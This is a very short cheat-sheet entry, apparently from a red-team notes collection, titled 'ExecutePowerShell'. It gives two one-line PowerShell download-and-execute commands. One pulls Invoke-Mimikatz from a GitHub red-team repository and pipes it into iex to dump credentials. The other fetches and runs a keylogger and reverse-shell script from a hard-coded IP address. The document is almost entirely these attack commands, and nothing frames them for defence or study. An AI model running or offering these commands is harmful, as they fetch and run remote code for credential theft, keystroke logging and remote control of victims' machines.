# ExecutePowerShell
Download &amp; Execute PowerShell Scripts


. { iwr -useb https://raw.githubusercontent.com/d0nkeys/redteam/master/credentials/Invoke-Mimikatz.ps1 } | iex


powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://172.20.35.55/keylog_RevShell.ps1')"
